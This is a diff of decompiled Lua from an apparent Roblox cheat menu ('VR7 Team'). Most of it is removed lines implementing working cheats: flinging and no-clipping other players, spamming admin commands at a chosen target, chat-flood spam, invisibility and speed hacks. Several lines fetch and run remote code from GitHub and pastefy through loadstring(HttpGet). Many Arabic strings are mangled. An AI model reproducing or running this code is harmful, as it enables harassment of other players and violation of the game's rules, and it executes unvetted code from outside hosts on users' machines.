-            if getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\167\216\176 \216\167\217\132\216\167\217\133\216\177 \217\138\216\183\217\138\216\177 \216\167\217\138 \216\180\216\174\216\181 \217\138\216\181\216\175\217\133 \216\168\216\175\216\177\216\167\216\172\216\170\217\131 \217\136\216\167\217\134\216\170 \216\170\216\179\217\136\217\130\217\135\216\167", 10)
-                SendNotify("\239\191\189\216\173\216\176\217\138\216\177", "\239\191\189\216\167\216\170\216\177\217\131\216\168 \216\179\217\138\216\167\216\177\216\169 \217\136\216\167\217\134\216\170 \217\133\216\180\216\186\217\132 \217\135\216\176\216\167 \216\167\217\132\216\167\217\133\216\177", 10)
-                local v494 = 0.1
-                while getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                    task.wait()
-                    game:GetService("RunService").Heartbeat:Wait()
-                    local v495 = game.Players.LocalPlayer.Character
-                    if v495 then
-                        v495 = v495:FindFirstChild("HumanoidRootPart")
-                    end
-                    if v495 then
-                        local v496 = v495.Velocity
-                        v495.Velocity = v496 * 1000 + Vector3.new(0, 1000, 0)
-                        game:GetService("RunService").RenderStepped:Wait()
-                        v495.Velocity = v496
-                        game:GetService("RunService").Stepped:Wait()
-                        v495.Velocity = v496 + Vector3.new(0, v494, 0)
-                        v494 = - v494
-                    end
-                    local v497, v498, v499 = ipairs(game.Players:GetPlayers())
-                    while true do
-                        local v500
-                        v499, v500 = v497(v498, v499)
-                        if v499 == nil then
-                            break
-                        end
-                        if v500 ~= game.Players.LocalPlayer then
-                            local v501, v502, v503 = ipairs(v500:GetChildren())
-                            while true do
-                                local v504
-                                v503, v504 = v501(v502, v503)
-                                if v503 == nil then
-                                    break
-                                end
-                                if v504:IsA("BasePart") then
-                                    v504.CanCollide = false
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-        getgenv().RainbowTjm35.t2.MouseButton1Click:Connect(function()
-            ChangeToggleColor(getgenv().RainbowTjm35.t2)
-            if getgenv().RainbowTjm35.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                getgenv().loopfling = false
-            else
-                getgenv().loopfling = true
-                if not getgenv().working then
-                    if workspace["Football plan"].Football:FindFirstChild("Ball") then
-                        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\216\174\216\170\217\129\216\170 \216\167\217\132\217\131\217\136\216\177\216\169 \216\179\217\136\217\129 \216\170\216\172\216\175\217\135\216\167 \217\129\217\138 \216\167\217\132\217\133\217\132\216\185\216\168", 5)
-                        Flinger(workspace["Football plan"].Football.Ball)
-                    else
-                        SendNotify("\239\191\189\216\183\216\167", "\239\191\189\216\176\216\177\216\167 \217\132\216\167\217\138\217\136\216\172\216\175 \217\131\217\136\216\177\216\169 \217\129\217\138 \216\167\217\132\216\179\217\138\216\177\217\129\216\177 \217\138\216\177\216\172\217\137 \216\170\216\186\217\138\217\138\216\177 \216\167\217\132\216\179\217\138\216\177\217\129\216\177", 5)
-                    end
-                end
-            end
-        end)
-        LoadChatAlert()
-    end
-    if GetRank() and GetRank() ~= "Not Enabled" then
-        getgenv().AdminSpamming = CreateButtonWithText(v260, "Spamming_Commands", "\239\191\189\216\179\216\174 \216\167\217\136\216\167\217\133\216\177", UDim2.new(0, 210, 0, 400), "\239\191\189\216\173\216\170\216\167\216\172 \216\167\216\175\217\133\217\134", 0)
-        getgenv().Cmdbar_Button = Instance.new("TextButton")
-        getgenv().Cmdbar_Button.Name = "Cmdbar_Button"
-        getgenv().Cmdbar_Button.Parent = vu232
-        getgenv().Cmdbar_Button.BackgroundTransparency = 0.3
-        getgenv().Cmdbar_Button.BackgroundColor3 = Color3.fromRGB(v34, v35, v36)
-        getgenv().Cmdbar_Button.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-        getgenv().Cmdbar_Button.BorderSizePixel = 1
-        getgenv().Cmdbar_Button.Position = UDim2.new(0, 25, 0, 24)
-        getgenv().Cmdbar_Button.Size = UDim2.new(0, 30, 0, 30)
-        getgenv().Cmdbar_Button.Font = Enum.Font.Oswald
-        getgenv().Cmdbar_Button.Text = utf8.char(709)
-        getgenv().Cmdbar_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
-        getgenv().Cmdbar_Button.TextScaled = true
-        getgenv().Cmdbar_Button.TextSize = 14
-        getgenv().Cmdbar_Button.TextWrapped = true
-        getgenv().AdminSpamming.t2.MouseButton1Click:Connect(function()
-            if vu41 ~= nil then
-                ChangeToggleColor(getgenv().getgenv().AdminSpamming.t2)
-                if getgenv().AdminSpamming.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                    while getgenv().AdminSpamming.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                        pcall(function()
-                            local v505 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                            local v506 = vu37[vu41].Character:FindFirstChild("HDAdminTitle", true)
-                            if v506 and v506.TextLabel.Text ~= "\239\191\189\216\173\216\168\217\135" then
-                                game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "titlepk " .. vu37[vu41].Name .. " \217\129\216\173\216\168\217\135")
-                            elseif not v506 then
-                                game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "titlepk " .. vu37[vu41].Name .. " \217\129\216\173\216\168\217\135")
-                            end
-                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "size " .. vu37[vu41].Name .. " 3")
-                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "height " .. vu37[vu41].Name .. " 0")
-                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "aura " .. vu37[vu41].Name)
-                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "color " .. vu37[vu41].Name .. " p")
-                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v505 .. "shine " .. vu37[vu41].Name)
-                        end)
-                        wait(5)
-                    end
-                end
-            end
-        end)
-        getgenv().Cmdbar_Button.MouseButton1Click:Connect(function()
-            if game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.CmdBar.Visible then
-                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.CmdBar.Visible = false
-                getgenv().Cmdbar_Button.Text = utf8.char(709)
-            else
-                game:GetService("Players").LocalPlayer.PlayerGui.HDAdminInterface.CmdBar.Visible = true
-                getgenv().Cmdbar_Button.Text = utf8.char(708)
-            end
-        end)
-    end
-    CreateToggle(vu235)
-    CreateClicker(v233)
-    CreateClicker(v234)
-    CreateToggle(vu259)
-    CreateClicker(v246)
-    CreateClicker(v248)
-    CreateClicker(v250)
-    CreateClicker(v251)
-    CreateClicker(v254)
-    CreateClicker(v256)
-    CreateClicker(v257)
-    CreateToggle(vu252)
-    CreateToggle(vu255)
-    CreateToggle(vu253)
-    CreateToggle(vu266)
-    CreateToggle(vu265)
-    CreateToggle(vu267)
-    CreateToggle(vu268)
-    CreateToggle(vu269)
-    CreateToggle(vu272)
-    CreateToggle(vu273)
-    CreateToggle(vu275)
-    CreateToggle(vu274)
-    CreateToggle(vu270)
-    CreateClicker(v271)
-    CreateClicker(v279)
-    CreateClicker(v281)
-    CreateClicker(v280)
-    CreateClicker(v282)
-    CreateClicker(v283)
-    CreateClicker(v284)
-    CreateClicker(v285)
-    CreateClicker(v286)
-    CreateClicker(v287)
-    CreateClicker(v288)
-    CreateClicker(v289)
-    CreateClicker(v290)
-    CreateClicker(v291)
-    CreateClicker(v292)
-    CreateClicker(v293)
-    CreateClicker(v294)
-    CreateClicker(v295)
-    CreateClicker(v296)
-    CreateClicker(v298)
-    CreateClicker(v297)
-    CreateClicker(v301)
-    CreateClicker(v302)
-    CreateClicker(v303)
-    CreateClicker(v304)
-    CreateClicker(v305)
-    CreateClicker(v306)
-    CreateClicker(getgenv().SaluteAnimationR15)
-    CreateClicker(getgenv().ArmcutAnimationR6)
-    CreateClicker(getgenv().BoxesAnimationR6)
-    CreateClicker(getgenv().FaintAnimationR6)
-    CreateClicker(getgenv().DoggyAnimationR15)
-    CreateClicker(getgenv().HugAnimationR15)
-    CreateClicker(getgenv().DolphinAnimationR15)
-    CreateClicker(getgenv().Sb3awyAnimationR15)
-    CreateClicker(getgenv().ZombieWalkAnimationR15)
-    CreateClicker(getgenv().FlingArmsAnimationR15)
-    CreateClicker(getgenv().AhmAhmAnimationR15)
-    CreateClicker(getgenv().SleepyAnimationR15)
-    CreateClicker(getgenv().CrazyAnimationR15)
-    CreateClicker(getgenv().B3b3AnimationR15)
-    CreateClicker(getgenv().HugAnimationR6)
-    CreateClicker(getgenv().BangAnimationR6)
-    CreateClicker(getgenv().InsaneAnimationR6)
-    CreateClicker(getgenv().BackpackHeadAnimationR6)
-    CreateClicker(getgenv().FloatingHeadAnimationR6)
-    CreateClicker(getgenv().JerkingAnimationR6)
-    CreateClicker(getgenv().IllusionAnimationR6)
-    CreateToggle(vu308)
-    CreateToggle(vu309)
-    CreateToggle(vu310)
-    CreateToggle(vu311)
-    CreateClicker(v312)
-    CreateClicker(v313)
-    CreateClicker(v314)
-    CreateClicker(v322)
-    CreateClicker(v318)
-    CreateClicker(v315)
-    CreateClicker(v316)
-    CreateClicker(v317)
-    task.wait(0.5)
-    function ChangeSection(p507)
-        SectionClickedName = string.split(p507.Name, "_")[1]
-        local v508 = vu224
-        local v509, v510, v511 = pairs(v508:GetChildren())
-        while true do
-            local v512
-            v511, v512 = v509(v510, v511)
-            if v511 == nil then
-                break
-            end
-            if v512.Name == p507.Name then
-                v512.Transparency = 0
-            else
-                v512.Transparency = 0.5
-            end
-        end
-        local v513 = vu221
-        local v514, v515, v516 = pairs(v513:GetChildren())
-        while true do
-            local v517
-            v516, v517 = v514(v515, v516)
-            if v516 == nil then
-                break
-            end
-            if v517:IsA("ScrollingFrame") then
-                SectionForName = string.split(v517.Name, "_")[1]
-                if string.find(SectionClickedName, SectionForName) then
-                    v517.Visible = true
-                else
-                    v517.Visible = false
-                end
-            end
-        end
-    end
-    function UpdateTarget(pu518)
-        pcall(function()
-            if pu518.UserId ~= 951402104 then
-                if table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Hehehe"))(), tostring(pu518.UserId)) or table.find(loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Usernames"))(), tostring(pu518.UserId)) then
-                    game:GetService("StarterGui"):SetCore("SendNotification", {
-                        Title = "VR7 Team",
-                        Text = "\239\191\189\216\167\217\138\217\133\217\131\217\134\217\131 \216\167\216\174\216\170\217\138\216\167\216\177 \217\135\216\176\216\167 \216\167\217\132\216\167\216\185\216\168\n \217\132\216\167\217\134\217\135 \217\133\216\173\217\133\217\138 \217\133\217\134 \216\181\216\167\216\173\216\168 \216\167\217\132\216\179\217\131\216\177\216\168\216\170",
-                        Duration = 5,
-                        Icon = "rbxassetid://136772242182146"
-                    })
-                    local vu519 = Instance.new("Sound", game.Workspace)
-                    vu519.SoundId = "rbxassetid://1862047553"
-                    vu519.Volume = 10
-                    vu519.Ended:Connect(function()
-                        vu519:Destroy()
-                    end)
-                    local v520 = vu519
-                    vu519.Play(v520)
-                    pu518 = nil
-                end
-            else
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "VR7 Team",
-                    Text = "\239\191\189\216\172\216\177\216\167\216\161 \216\174\216\167\216\183\216\166 \217\132\216\167\217\134 \216\177\216\167\216\185\217\138\n  \216\167\217\132\216\173\216\179\216\167\216\168 \216\170\216\173\216\170 \216\173\217\133\216\167\217\138\216\169 \216\173\216\179\217\136\217\134\217\138",
-                    Duration = 5,
-                    Icon = "rbxassetid://6710742632"
-                })
-                local vu521 = Instance.new("Sound", game.Workspace)
-                vu521.SoundId = "rbxassetid://17692186249"
-                vu521.Volume = 10
-                vu521.Ended:Connect(function()
-                    vu521:Destroy()
-                end)
-                local v522 = vu521
-                vu521.Play(v522)
-                pu518 = nil
-            end
-        end)
-        if pu518 == nil then
-            vu263.Text = "@target..."
-            vu264.Text = "UserID: \nDisplay: \nJoined: "
-            vu261.Image = "rbxassetid://10818605405"
-            vu41 = nil
-            if vu267.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                vu267.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                vu235.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            end
-            vu266.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu265.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu269.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu272.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu273.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu274.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu275.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            vu270.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if TalkRepeater then
-                TalkRepeater:Disconnect()
-            end
-            pcall(function()
-                getgenv().AdminSpamming.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            end)
-            pcall(function()
-                if game.PlaceId == 11379739543 then
-                    getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                end
-            end)
-        else
-            vu41 = pu518.Name
-            vu263.Text = pu518.Name
-            vu264.Text = "UserID: " .. pu518.UserId .. "\nDisplay: " .. pu518.DisplayName .. "\nJoined: " .. os.date("%d-%m-%Y", os.time() - pu518.AccountAge * 24 * 3600) .. " [\216\179\217\134\216\169/\216\180\217\135\216\177/\217\138\217\136\217\133]"
-            vu261.Image = vu37:GetUserThumbnailAsync(pu518.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-            vu270.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-            if TalkRepeater then
-                TalkRepeater:Disconnect()
-            end
-            vu268.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-        end
-    end
-    ChangeSection(vu225)
-    vu225.MouseButton1Click:Connect(function()
-        ChangeSection(vu225)
-    end)
-    vu226.MouseButton1Click:Connect(function()
-        ChangeSection(vu226)
-    end)
-    vu227.MouseButton1Click:Connect(function()
-        ChangeSection(vu227)
-    end)
-    vu228.MouseButton1Click:Connect(function()
-        ChangeSection(vu228)
-    end)
-    vu229.MouseButton1Click:Connect(function()
-        ChangeSection(vu229)
-    end)
-    vu230.MouseButton1Click:Connect(function()
-        ChangeSection(vu230)
-    end)
-    vu231.MouseButton1Click:Connect(function()
-        ChangeSection(vu231)
-    end)
-    vu235.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu235)
-        if vu235.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-            repeat
-                wait(0.15)
-                Send(vu47)
-            until vu235.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0)
-        end
-    end)
-    v233.MouseButton1Click:Connect(function()
-        if game:GetService("TextChatService").ChatVersion ~= Enum.ChatVersion.TextChatService then
-            SendNotify("System VR7", "\239\191\189\216\167\216\176 \216\167\217\132\217\134\217\136\216\185 \217\133\217\134 \216\167\217\132\216\180\216\167\216\170 \216\186\217\138\216\177 \217\133\216\175\216\185\217\136\217\133 \216\168\216\179\216\168\216\168 \217\136\216\172\217\136\216\175 \216\173\217\133\216\167\217\138\217\135", 5)
-        else
-            local v523 = 0
-            repeat
-                task.wait()
-                v523 = v523 + 1
-                Send("\239\191\189\216\167\217\138\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r.")
-            until v523 >= 3
-            SendNotify("System VR7", "\239\191\189\217\134\216\170\216\168\217\135 \216\167\216\176\216\167 \216\170\216\179\217\136\217\138 \216\179\216\168\216\167\217\133 \217\131\216\171\217\138\216\177 \216\167\216\173\216\170\217\133\216\167\217\132 \217\138\216\172\217\138\217\131 \216\170\216\173\216\176\217\138\216\177", 5)
-        end
-    end)
-    v234.MouseButton1Click:Connect(function()
-        local v524 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Bwhw827g29wh/Scripts/refs/heads/main/FetchAndExecute.lua"))()
-        local v525 = game.Players.LocalPlayer
-        local v526 = v525.Character or v525.CharacterAdded:Wait()
-        if v526 then
-            local v527 = v526:FindFirstChildOfClass("Humanoid")
-            if v527 and v527.RigType == Enum.HumanoidRigType.R15 then
-                v524:fetchAndExecute("https://pastefy.app/YZoglOyJ/raw")
-            else
-                v524:fetchAndExecute("https://pastefy.app/wa3v2Vgm/raw")
-            end
-        end
-    end)
-    vu236.FocusLost:Connect(function()
-        command = vu236.Text
-        Execute(command)
-        vu236.Text = ""
-    end)
-    vu237.FocusLost:Connect(function()
-        vu47 = vu237.Text
-    end)
-    v246.MouseButton1Click:Connect(function()
-        if game.PlaceId ~= 11379739543 then
-            pcall(function()
-                local v528 = vu247.Text:gsub("%D", "")
-                local v529 = v528 == "" and 16 or v528
-                vu38.Character.Humanoid.WalkSpeed = tonumber(v529)
-                SendNotify("System VR7", "\239\191\189\217\133 \216\170\216\173\216\175\217\138\216\171 \216\167\217\132\216\179\216\177\216\185\216\169", 5)
-            end)
-        else
-            if getgenv().Tpwalking then
-                getgenv().Tpwalking = false
-                SendNotify("System VR7", "\239\191\189\216\182\216\186\216\183 \217\133\216\177\216\169 \216\171\216\167\217\134\217\138\216\169 \217\132\217\132\216\170\216\179\216\177\217\138\216\185", 5)
-            elseif not getgenv().Tpwalking then
-                getgenv().Tpwalking = true
-                SendNotify("System VR7", "\239\191\189\216\182\216\186\216\183 \217\133\216\177\216\169 \216\171\216\167\217\134\217\138\216\169 \217\132\216\167\216\177\216\172\216\167\216\185 \216\167\217\132\216\179\216\177\216\185\216\169 \216\167\217\132\216\183\216\168\217\138\216\185\217\138\216\169", 5)
-            end
-            local v530 = vu247.Text:gsub("%D", "")
-            local vu531 = v530 == "" and 1 or (tonumber(v530) > 10 and 10 or v530)
-            while getgenv().Tpwalking do
-                task.wait()
-                pcall(function()
-                    local v532 = game:GetService("RunService").Heartbeat:Wait()
-                    if game.Players.LocalPlayer.Character.Humanoid.MoveDirection.Magnitude <= 0 then
-                        game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * v532 * 10)
-                    else
-                        game.Players.LocalPlayer.Character:TranslateBy(game.Players.LocalPlayer.Character.Humanoid.MoveDirection * vu531 * v532 * 10)
-                    end
-                end)
-            end
-        end
-    end)
-    v250.MouseButton1Click:Connect(function()
-        pcall(function()
-            local v533 = vu249.Text:gsub("%D", "")
-            local v534 = v533 == "" and 50 or v533
-            vu38.Character.Humanoid.JumpPower = tonumber(v534)
-            SendNotify("System VR7", "\239\191\189\217\133 \216\170\216\173\216\175\217\138\216\171 \217\130\217\136\216\169 \216\167\217\132\217\130\217\129\216\178", 5)
-        end)
-    end)
-    v257.MouseButton1Click:Connect(function()
-        pcall(function()
-            local v535 = vu258.Text:gsub("%D", "")
-            local v536 = v535 == "" and 50 or v535
-            vu42 = tonumber(v536)
-            SendNotify("System VR7", "\239\191\189\217\133 \216\170\216\173\216\175\217\138\216\171 \216\179\216\177\216\185\216\169 \216\167\217\132\216\183\217\138\216\177\216\167\217\134", 5)
-        end)
-    end)
-    local vu537 = nil
-    local vu538 = nil
-    local vu539 = nil
-    local vu540 = nil
-    vu253.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu253)
-        if vu253.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-            pcall(function()
-                if vu540 and (vu538 and vu537) and (vu538:FindFirstChild("HumanoidRootPart") and (vu537:FindFirstChild("HumanoidRootPart") and (vu537.Humanoid.Health > 0 and vu538.Humanoid.Health))) then
-                    Invisible()
-                end
-            end)
-        else
-            if not getgenv().EnabledBefore then
-                getgenv().EnabledBefore = true
-                local vu541 = game:GetService("Players").LocalPlayer
-                vu538 = vu541.Character or vu541.CharacterAdded:Wait()
-                vu539 = false
-                vu538.Archivable = true
-                vu537 = vu538:Clone()
-                local vu542 = Instance.new("Part", workspace)
-                vu542.Anchored = true
-                vu542.Size = Vector3.new(200, 1, 200)
-                vu542.CFrame = CFrame.new(0, - 500, 0)
-                vu542.CanCollide = true
-                vu542.Transparency = 1
-                vu537.Parent = workspace
-                vu537.HumanoidRootPart.CFrame = vu542.CFrame * CFrame.new(0, 5, 0)
-                local v543 = vu538
-                local v544, v545, v546 = pairs(v543:GetChildren())
-                while true do
-                    local v547
-                    v546, v547 = v544(v545, v546)
-                    if v546 == nil then
-                        break
-                    end
-                    if v547:IsA("LocalScript") then
-                        local v548 = v547:Clone()
-                        v548.Disabled = true
-                        v548.Parent = vu537
-                    end
-                end
-                local v549 = vu537
-                local v550, v551, v552 = pairs(v549:GetDescendants())
-                while true do
-                    local v553
-                    v552, v553 = v550(v551, v552)
-                    if v552 == nil then
-                        break
-                    end
-                    if v553:IsA("BasePart") and v553.Name == "HumanoidRootPart" then
-                        v553.Transparency = 1
-                    elseif v553:IsA("BasePart") then
-                        v553.Transparency = 0.5
-                    end
-                end
-                vu540 = true
-                local function vu565()
-                    game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-                    if vu537 and vu537.Parent then
-                        vu537:Destroy()
-                    end
-                    if vu542 and vu542.Parent then
-                        vu542:Destroy()
-                    end
-                    vu538.Archivable = true
-                    vu537 = vu538:Clone()
-                    vu542 = Instance.new("Part", workspace)
-                    vu542.Anchored = true
-                    vu542.Size = Vector3.new(200, 1, 200)
-                    vu542.CFrame = CFrame.new(0, - 500, 0)
-                    vu542.CanCollide = true
-                    vu542.Transparency = 1
-                    vu537.Parent = workspace
-                    vu537.HumanoidRootPart.CFrame = vu542.CFrame * CFrame.new(0, 5, 0)
-                    local v554 = vu537
-                    local v555, v556, v557 = pairs(v554:GetChildren())
-                    while true do
-                        local v558
-                        v557, v558 = v555(v556, v557)
-                        if v557 == nil then
-                            break
-                        end
-                        if v558:IsA("LocalScript") then
-                            local v559 = v558:Clone()
-                            v559.Disabled = true
-                            v559.Parent = vu537
-                        end
-                    end
-                    local v560 = vu537
-                    local v561, v562, v563 = pairs(v560:GetDescendants())
-                    while true do
-                        local v564
-                        v563, v564 = v561(v562, v563)
-                        if v563 == nil then
-                            break
-                        end
-                        if v564:IsA("BasePart") then
-                            if v564.Name ~= "HumanoidRootPart" then
-                                v564.Transparency = 0.5
-                            else
-                                v564.Transparency = 1
-                            end
-                        end
-                    end
-                    if vu537:FindFirstChild("Humanoid") then
-                        vu537.Humanoid.Died:Connect(function()
-                            if vu538 and vu538:FindFirstChild("Humanoid") then
-                                vu538.Humanoid.Health = 0
-                            end
                         end)
                     end
-                    PseudoAnchor = vu537:FindFirstChild("HumanoidRootPart")
-                end
-                function CharacterDied()
-                    game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-                    vu540 = false
-                    vu541.CharacterAdded:Wait()
-                    vu538 = vu541.Character or vu541.CharacterAdded:Wait()
-                    vu540 = true
-                    vu539 = false
-                    local v566 = vu538
-                    workspace.CurrentCamera.CameraSubject = v566:WaitForChild("Humanoid")
-                    vu538:WaitForChild("Humanoid").Died:Connect(function()
-                        CharacterDied()
-                        vu253.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    end)
-                    vu565()
-                end
-                vu538.Humanoid.Died:Connect(function()
-                    vu537:Destroy()
-                end)
-                vu537.Humanoid.Died:Connect(function()
-                    vu538.Humanoid.Health = 0
-                end)
-                vu541.CharacterAppearanceLoaded:Connect(CharacterDied)
-                local vu567 = nil
-                game:GetService("RunService").RenderStepped:Connect(function()
-                    if vu567 ~= nil then
-                        vu567.CFrame = vu542.CFrame * CFrame.new(0, 5, 0)
+
+                    
+                    while getgenv().antiHouseBan do
+
+                        
+                        for _, house in ipairs(lotsFolder:GetChildren()) do
+                            if house:IsA("Model") and house:FindFirstChild("HousePickedByPlayer") then
+                                checkAndRemoveBan(house)
+                                observeHouse(house) 
+                            end
+                        end
+                        
+
+                        
+                        task.wait(1) 
                     end
                 end)
-                vu567 = vu537.HumanoidRootPart
-                function Invisible()
-                    if vu539 then
-                        local v568 = workspace.Camera.CFrame
-                        local v569 = vu537.HumanoidRootPart.CFrame
-                        vu537.HumanoidRootPart.CFrame = vu538.HumanoidRootPart.CFrame
-                        vu538.HumanoidRootPart.CFrame = v569
-                        vu537.Humanoid:UnequipTools()
-                        vu541.Character = vu538
-                        workspace.CurrentCamera.CameraSubject = vu538.Humanoid
-                        vu567 = vu537.HumanoidRootPart
-                        local v570 = vu537
-                        local v571, v572, v573 = pairs(v570:GetChildren())
-                        while true do
-                            local v574
-                            v573, v574 = v571(v572, v573)
-                            if v573 == nil then
-                                break
-                            end
-                            if v574:IsA("LocalScript") then
-                                v574.Disabled = true
-                            end
-                        end
-                        task.wait()
-                        workspace.Camera.CFrame = v568
-                        vu539 = false
-                        vu253.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                    else
-                        local v575 = workspace.Camera.CFrame
-                        local v576 = vu538.HumanoidRootPart.CFrame
-                        vu538.HumanoidRootPart.CFrame = vu542.CFrame * CFrame.new(0, 5, 0)
-                        task.wait(0.1)
-                        vu537.HumanoidRootPart.CFrame = v576
-                        vu538.Humanoid:UnequipTools()
-                        vu541.Character = vu537
-                        workspace.CurrentCamera.CameraSubject = vu537.Humanoid
-                        vu567 = vu538.HumanoidRootPart
-                        local v577 = vu537
-                        local v578, v579, v580 = pairs(v577:GetChildren())
-                        while true do
-                            local v581
-                            v580, v581 = v578(v579, v580)
-                            if v580 == nil then
-                                break
-                            end
-                            if v581:IsA("LocalScript") then
-                                v581.Disabled = false
-                            end
-                        end
-                        task.wait()
-                        workspace.Camera.CFrame = v575
-                        vu539 = true
-                        vu253.Ticket_Asset.ImageColor3 = Color3.fromRGB(0, 255, 0)
-                    end
-                end
-                vu565()
-                vu538:WaitForChild("Humanoid").Died:Connect(function()
-                    CharacterDied()
-                end)
-            end
-            pcall(function()
-                if vu540 and (vu538 and vu537) and (vu538:FindFirstChild("HumanoidRootPart") and (vu537:FindFirstChild("HumanoidRootPart") and (vu537.Humanoid.Health > 0 and vu538.Humanoid.Health))) then
-                    Invisible()
-                end
-            end)
-            SendNotify("System VR7", "\239\191\189\216\176\216\167 \217\133\216\170\216\170 \216\180\216\186\217\132 \216\167\217\132\216\167\216\174\216\170\217\129\216\167\216\161 \217\133\217\134 \216\172\216\175\217\138\216\175", 5)
-        end
-    end)
-    vu255.MouseButton1Click:Connect(function()
-        ChangeToggleColor(vu255)
-        if vu255.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-            if game.CoreGui:FindFirstChild("ShiftlockGui") then
-                game.CoreGui:FindFirstChild("ShiftlockGui").Enabled = false
-                game.CoreGui:FindFirstChild("ShiftlockGui").LockButton.BtnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
-                EndForceShiftLock()
-            end
-        else
-            if game.CoreGui:FindFirstChild("ShiftlockGui") then
-                game.CoreGui:FindFirstChild("ShiftlockGui").Enabled = true
-                return
-            end
-            local v582 = Instance.new("ScreenGui")
-            local vu583 = Instance.new("ImageButton")
-            local v584 = Instance.new("ImageLabel")
-            local v585 = Instance.new("UICorner")
-            Instance.new("UICorner")
-            v582.Name = "ShiftlockGui"
-            v582.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-            v582.ResetOnSpawn = false
-            v582.DisplayOrder = 69
-            v582.Parent = game.CoreGui
-            vu583.Name = "LockButton"
-            vu583.Parent = v582
-            vu583.AnchorPoint = Vector2.new(0.5, 0.5)
-            vu583.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
-            vu583.BackgroundTransparency = 1
-            vu583.BorderSizePixel = 0
